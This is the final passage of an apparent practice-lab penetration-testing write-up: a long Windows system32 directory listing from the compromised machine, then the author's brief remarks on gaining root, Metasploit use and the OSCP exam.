14/07/2009  01:41            37,888 wmdmlog.dll
14/07/2009  01:41           117,248 wmdmps.dll
21/11/2010  03:24           636,416 wmdrmdev.dll
21/11/2010  03:24           527,872 wmdrmnet.dll
21/11/2010  03:24           781,312 wmdrmsdk.dll
14/07/2009  01:33             2,048 wmerror.dll
01/03/2012  06:28             5,120 wmi.dll
21/11/2010  03:24           524,288 wmicmiplugin.dll
14/07/2009  01:41           211,968 wmidx.dll
10/06/2009  20:59           144,673 WmiMgmt.msc
14/07/2009  01:41            27,648 wmiprop.dll
21/11/2010  03:24         1,243,136 WMNetMgr.dll
21/11/2010  03:24        14,633,472 wmp.dll
14/07/2009  01:41            28,672 wmpcm.dll
14/07/2009  01:41           229,376 WmpDui.dll
21/11/2010  03:24           358,400 wmpdxm.dll
21/11/2010  03:24           605,696 wmpeffects.dll
21/11/2010  03:24         2,072,576 WMPEncEn.dll
04/02/2015  03:16           465,920 WMPhoto.dll
21/11/2010  03:24        12,625,920 wmploc.DLL
08/12/2015  19:07         1,026,048 wmpmde.dll
21/11/2010  03:24           481,280 wmpps.dll
21/11/2010  03:24           132,608 wmpshell.dll
21/11/2010  03:24           223,232 wmpsrcwp.dll
14/07/2009  01:41            14,848 wmsgapi.dll
08/12/2015  19:07           978,944 WMSPDMOD.DLL
08/12/2015  19:07         1,575,424 WMSPDMOE.DLL
21/11/2010  03:24         3,027,968 WMVCORE.DLL
08/12/2015  19:07         1,888,768 WMVDECOD.DLL
14/07/2009  01:41           184,832 wmvdspa.dll
08/12/2015  19:07         1,955,328 WMVENCOD.DLL
08/12/2015  19:07           666,112 WMVSDECD.DLL
08/12/2015  19:07           447,488 WMVSENCD.DLL
08/12/2015  19:07           642,048 WMVXENCD.DLL
02/09/2016  15:31           243,712 wow64.dll
02/09/2016  15:31            13,312 wow64cpu.dll
02/09/2016  15:31           362,496 wow64win.dll
14/07/2009  01:39            16,384 wowreg32.exe
07/12/2012  13:20           441,856 Wpc.dll
14/07/2009  01:41           135,680 wpcao.dll
21/11/2010  03:24           812,032 wpccpl.dll
14/07/2009  01:41            17,408 wpcmig.dll
14/07/2009  01:41            12,288 wpcsvc.dll
14/07/2009  01:41           188,416 wpcumi.dll
21/11/2010  03:24           117,248 wpdbusenum.dll
29/01/2015  03:19         2,543,104 wpdshext.dll
14/07/2009  01:39            34,816 WPDShextAutoplay.exe
21/11/2010  03:24           115,200 WPDShServiceObj.dll
21/11/2010  03:24           431,104 WPDSp.dll
21/11/2010  03:24           215,040 wpdwcn.dll
21/11/2010  03:24           611,840 wpd_ci.dll
25/06/2016  19:53            48,640 wpnpinst.exe
14/07/2009  01:39            10,240 write.exe
14/07/2009  01:34             4,608 ws2help.dll
11/05/2016  17:02           296,448 ws2_32.dll
21/11/2010  03:24            63,488 wscapi.dll
14/07/2009  01:41           146,432 wscinterop.dll
14/07/2009  01:41            22,528 wscisvif.dll
14/07/2009  01:41            68,608 wscmisetup.dll
14/07/2009  01:41            13,824 wscproxystub.dll
12/10/2013  01:33           168,960 wscript.exe
14/07/2009  01:41            97,280 wscsvc.dll
14/07/2009  01:38         1,162,240 wscui.cpl
21/11/2010  03:24           577,536 WSDApi.dll
21/11/2010  03:24            26,112 wsdchngr.dll
14/07/2009  01:41           224,768 WSDMon.dll
14/07/2009  01:41            69,632 WSDPrintProxy.DLL
14/07/2009  01:41            67,072 WSDScanProxy.dll
14/07/2009  01:41         1,495,552 wsecedit.dll
14/07/2009  01:41            23,040 wsepno.dll
21/11/2010  03:24            47,104 wshbth.dll
14/07/2009  01:41            28,160 wshcon.dll
14/07/2009  01:41            19,968 wshelper.dll
14/07/2009  01:41           104,960 wshext.dll
14/07/2009  01:41            13,824 wship6.dll
21/11/2010  03:24            13,824 wshirda.dll
14/07/2009  01:41            13,312 wshnetbs.dll
12/10/2013  02:32           150,016 wshom.ocx
14/07/2009  01:41            16,896 wshqos.dll
05/11/2015  19:05            17,408 wshrm.dll
14/07/2009  01:41            13,312 WSHTCPIP.DLL
10/06/2009  21:00             4,675 wsmanconfig_schema.xml
14/07/2009  01:39           265,728 WSManHTTPConfig.exe
14/07/2009  01:41           346,112 WSManMigrationPlugin.dll
14/07/2009  01:41           181,248 WsmAuto.dll
14/07/2009  01:41            13,312 wsmplpxy.dll
14/07/2009  01:39            13,824 wsmprovhost.exe
10/06/2009  21:00             1,559 WsmPty.xsl
14/07/2009  01:34            54,272 WsmRes.dll
21/11/2010  03:24         2,018,304 WsmSvc.dll
10/06/2009  21:00             2,426 WsmTxt.xsl
14/07/2009  01:41           309,760 WsmWmiPl.dll
21/11/2010  03:24            67,072 wsnmp32.dll
14/07/2009  01:41            18,432 wsock32.dll
21/11/2010  03:24           293,888 wsqmcons.exe
21/11/2010  03:24            98,304 WSTPager.ax
14/07/2009  01:41            54,272 wtsapi32.dll
13/05/2016  21:52            12,288 wu.upgrade.ps.dll
13/05/2016  21:53           709,120 wuapi.dll
13/05/2016  21:53            37,888 wuapp.exe
13/05/2016  21:52           140,288 wuauclt.exe
13/05/2016  21:55         2,607,104 wuaueng.dll
13/05/2016  22:09         3,156,480 wucltux.dll
26/07/2012  03:08            45,056 WUDFCoinstaller.dll
26/07/2012  03:08           229,888 WUDFHost.exe
26/07/2012  03:08           194,048 WUDFPlatform.dll
26/07/2012  03:08            84,992 WUDFSvc.dll
26/07/2012  03:08           744,448 WUDFx.dll
13/05/2016  22:09            98,816 wudriver.dll
13/05/2016  21:52            36,864 wups.dll
13/05/2016  21:52            37,888 wups2.dll
21/11/2010  03:23           307,200 wusa.exe
13/05/2016  22:09           192,512 wuwebv.dll
21/11/2010  03:24           594,432 wvc.dll
14/07/2009  01:41           196,608 Wwanadvui.dll
14/07/2009  01:41           368,640 WWanAPI.dll
14/07/2009  01:41            49,664 wwancfg.dll
21/11/2010  03:24           222,720 wwanconn.dll
14/07/2009  01:41            73,728 WWanHC.dll
14/07/2009  01:41            15,872 wwaninst.dll
14/07/2009  01:41           693,248 wwanmm.dll
14/07/2009  01:41            46,592 Wwanpref.dll
19/03/2013  05:53            48,640 wwanprotdim.dll
28/01/2014  02:32           228,864 wwansvc.dll
14/07/2009  01:41            36,352 wwapi.dll
14/07/2009  01:41           103,936 wzcdlg.dll
14/07/2009  01:39            43,008 xcopy.exe
14/07/2009  01:41            30,720 XInput9_1_0.dll
14/07/2009  01:41            67,072 xmlfilter.dll
16/06/2011  05:49           199,680 xmllite.dll
14/07/2009  01:41            22,016 xmlprovi.dll
14/07/2009  01:41            59,392 xolehlp.dll
14/07/2009  01:41           968,704 XpsFilt.dll
14/07/2017  17:51           522,752 XpsGdiConverter.dll
14/07/2017  17:51         1,682,432 XpsPrint.dll
21/11/2010  03:24           229,888 XpsRasterService.dll
14/07/2009  01:39         4,835,840 xpsrchvw.exe
10/06/2009  20:31            76,060 xpsrchvw.xml
21/11/2010  03:24         3,008,000 xpsservices.dll
14/07/2009  01:41           706,560 XPSSHHDR.dll
14/07/2009  01:41         1,576,448 xpssvcs.dll
10/06/2009  21:03             4,041 xwizard.dtd
14/07/2009  01:39            42,496 xwizard.exe
14/07/2009  01:41           432,640 xwizards.dll
14/07/2009  01:41           101,888 xwreg.dll
14/07/2009  01:41           201,216 xwtpdui.dll
14/07/2009  01:41           129,536 xwtpw32.dll
15/07/2017  07:54    <DIR>          zh-CN
15/07/2017  07:54    <DIR>          zh-HK
15/07/2017  07:54    <DIR>          zh-TW
21/11/2010  03:24           366,080 zipfldr.dll
            2565 File(s)  1,276,052,245 bytes
              91 Dir(s)  17,255,096,320 bytes free

C:\Windows\system32>


```
I am root, nice/ I hate the fact that all these easy machines require some form of metasploit. It kinda is not allowed on OSCP. 3/10 not a complex box.
